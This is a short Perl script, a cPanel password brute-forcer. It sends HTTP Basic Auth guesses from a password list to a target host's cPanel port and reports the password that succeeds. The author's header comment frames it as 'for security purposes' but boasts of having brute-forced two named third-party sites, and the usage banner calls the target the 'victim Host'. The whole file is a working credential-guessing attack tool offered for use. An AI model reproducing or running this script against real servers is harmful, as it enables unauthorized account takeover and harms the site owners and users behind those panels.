#!/usr/bin/perl
# [Perl] Cpanel Bruteforcer
# Perl Version
#Usage : cpanel.pl [HOST] [User] [PORT] [list] [File]
#All rights goes to Chris Poole, This was made for the intent of security purposes, It's been tested and successfully bruteforced Stresser.in & 1337hacking.li cpanels, I'd recommend iphostinfo.com to find the mail servers, cpanel's, admin login's etc, I'm sorry for making this in perl & args, Ill make a python version as soon as i can! -Chris Poole
use IO::Socket;
use LWP::Simple;
use MIME::Base64;

$host = $ARGV[0];
$user = $ARGV[1];
$port = $ARGV[2];
$list = $ARGV[3];
$file = $ARGV[4];
$url = "http://".$host.":".$port;
if(@ARGV < 3){
print q(
## ##
# [Perl] Cpanel Bruteforcer #
## ##
# usage : cpanel.pl [HOST] [User] [PORT][list] [File] #
#--#
# [Host] : victim Host (google.com) #
# [User] : User Name (admin/root/administrator) #
# [PORT] : Port of Cpanel (2082) #
# [list] : File Of password list (list.txt) #
# [File] : file for save password (password.txt) #
);exit;}

headx();

$numstart = "-1";

sub headx() {
print q(
## ##
# [Perl] Cpanel Bruteforcer #
## ##
);
open (PASSFILE, "<$list") || die "[-] Can't open password list! Please rename the file to 'list.txt'";
@PASSWORDS = <PASSFILE>;
close PASSFILE;
foreach my $P (@PASSWORDS) {
chomp $P;
$passwd = $P;
print "\n [~] Try Password : $passwd \n";
&brut;
};
}
sub brut() {
$authx = encode_base64($user.":".$passwd);
print $authx;
my $sock = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "\n [-] Can not connect to the host";
print $sock "GET / HTTP/1.1\n";
print $sock "Authorization: Basic $authx\n";
print $sock "Connection: Close\n\n";
read $sock, $answer, 128;
close($sock);

if ($answer =~ /Moved/) {
print "\n [~] PASSWORD FOUND : $passwd \n";
exit();
}
}